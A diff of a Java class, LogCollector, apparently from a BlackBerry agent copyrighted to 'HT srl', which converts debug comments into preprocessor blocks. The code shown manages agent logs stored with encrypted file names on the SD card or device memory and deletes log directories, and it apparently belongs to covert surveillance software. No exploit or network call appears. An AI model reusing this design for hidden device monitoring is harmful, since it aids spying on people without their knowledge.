@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -38,8 +39,9 @@ import blackberry.utils.StringSortVector;
  *         TODO Ordinare le cartelle e i file
  */
 public final class LogCollector implements Singleton {
-    //#debug
+    //#ifdef DEBUG
     private static Debug debug = new Debug("LogCollector", DebugLevel.VERBOSE);
+    //#endif
 
     static LogCollector instance = null;
 
@@ -130,8 +132,9 @@ public final class LogCollector implements Singleton {
     }
 
     public synchronized void removeProgressive() {
-        //#debug info
+        //#ifdef DEBUG_INFO
         debug.info("Removing Progressive");
+        //#endif
         PersistentStore.destroyPersistentObject(PERSISTENCE_KEY);
     }
 
@@ -141,8 +144,9 @@ public final class LogCollector implements Singleton {
         final Object obj = logProgressivePersistent.getContents();
 
         if (obj == null) {
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("First time of logProgressivePersistent");
+            //#endif
             logProgressivePersistent.setContents(new Integer(1));
         }
 
@@ -162,8 +166,9 @@ public final class LogCollector implements Singleton {
      */
     public synchronized Log factory(final Agent agent, final boolean onSD) {
         if (getLogNum() > MAX_LOG_NUM) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("Max log reached");
+            //#endif
             return null;
         }
 
@@ -216,8 +221,10 @@ public final class LogCollector implements Singleton {
         logProgressive++;
         logProgressivePersistent.setContents(new Integer(logProgressive));
 
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("Progressive: " + logProgressive);
+
+        //#endif
         return logProgressive;
     }
 
@@ -278,14 +285,16 @@ public final class LogCollector implements Singleton {
      *            the log name
      */
     public void remove(final String logName) {
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("Removing file: " + logName);
+        //#endif
         final AutoFlashFile file = new AutoFlashFile(logName, false);
         if (file.exists()) {
             file.delete();
         } else {
-            // #debug
+            //#ifdef DEBUG
             debug.warn("File doesn't exists: " + logName);
+            //#endif
         }
     }
 
@@ -294,16 +303,19 @@ public final class LogCollector implements Singleton {
      */
 
     public synchronized void removeLogDirs() {
-        //#debug info
+        //#ifdef DEBUG_INFO
         debug.info("removeLogDirs");
+        //#endif
         removeLogRecursive(Path.SD_PATH, false);
         removeLogRecursive(Path.USER_PATH, false);
     }
 
     private void removeLogRecursive(String basePath, boolean delete) {
 
-        //#debug info
+        //#ifdef DEBUG_INFO
         debug.info("RemovingLog: " + basePath);
+
+        //#endif
 
         FileConnection fc;
         try {
@@ -315,8 +327,10 @@ public final class LogCollector implements Singleton {
                 while (fileLogs.hasMoreElements()) {
                     final String file = (String) fileLogs.nextElement();
 
-                    //#debug debug
+                    //#ifdef DEBUG_TRACE
                     debug.trace("removeLog: " + file);
+
+                    //#endif
                     removeLogRecursive(basePath + file, true);
                 }
             }
@@ -328,8 +342,9 @@ public final class LogCollector implements Singleton {
             fc.close();
 
         } catch (final IOException e) {
-            //#debug error
+            //#ifdef DEBUG_ERROR
             debug.error("removeLog: " + basePath + " ex: " + e);
+            //#endif
         }
 
     }
@@ -342,9 +357,9 @@ public final class LogCollector implements Singleton {
      * @return the vector
      */
     public Vector scanForDirLogs(final String currentPath) {
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(currentPath != null, "null argument");
-        // #endif
+        //#endif
 
         final StringSortVector vector = new StringSortVector();
         FileConnection fc;
@@ -361,8 +376,9 @@ public final class LogCollector implements Singleton {
                     // scanForLogs(dir);
                     // return scanForLogs(file);
                     vector.addElement(dir);
-                    //#debug debug
+                    //#ifdef DEBUG_TRACE
                     debug.trace("scanForDirLogs adding: " + dir);
+                    //#endif
 
                 }
 
@@ -372,13 +388,16 @@ public final class LogCollector implements Singleton {
             fc.close();
 
         } catch (final IOException e) {
-            //#debug error
+            //#ifdef DEBUG_ERROR
             debug.error("scanForDirLogs: " + e);
+            //#endif
 
         }
 
-        //#debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("scanForDirLogs #: " + vector.size());
+
+        //#endif
 
         return vector;
     }
@@ -395,9 +414,9 @@ public final class LogCollector implements Singleton {
      * @return the vector
      */
     public Vector scanForLogs(final String currentPath, final String dir) {
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(currentPath != null, "null argument");
-        // #endif
+        //#endif
 
         final DoubleStringSortVector vector = new DoubleStringSortVector();
 
@@ -418,19 +437,22 @@ public final class LogCollector implements Singleton {
 
                 if (file.endsWith(encLogMask)) {
                     // String encName = fcFile.getName();
-                    // #debug debug
+                    //#ifdef DEBUG_TRACE
                     debug.trace("enc name: " + file);
+                    //#endif
                     final String plainName = decryptName(file);
-                    // #debug debug
+                    //#ifdef DEBUG_TRACE
                     debug.trace("plain name: " + plainName);
+                    //#endif
 
                     vector.addElement(plainName, file);
                 }
             }
 
         } catch (final IOException e) {
-            //#debug error
+            //#ifdef DEBUG_ERROR
             debug.error("scanForLogs: " + e);
+            //#endif
 
         } finally {
             if (fcDir != null) {
@@ -443,8 +465,10 @@ public final class LogCollector implements Singleton {
             }
         }
 
-        //#debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("scanForLogs numDirs: " + vector.size());
+
+        //#endif
         return vector.getValues();
     }
 
@@ -456,11 +480,13 @@ public final class LogCollector implements Singleton {
         clear();
 
         if(Path.isSDPresent() && Path.makeDirs(Path.SD)){
-            //#debug info
+            //#ifdef DEBUG_INFO
             debug.info("SD available and writable");
+            //#endif
         }else{
-            //#debug warn
+            //#ifdef DEBUG_WARN
             debug.warn("SD is not available or writable");
+            //#endif
             Path.SD_PATH = Path.USER_PATH;
         }
         
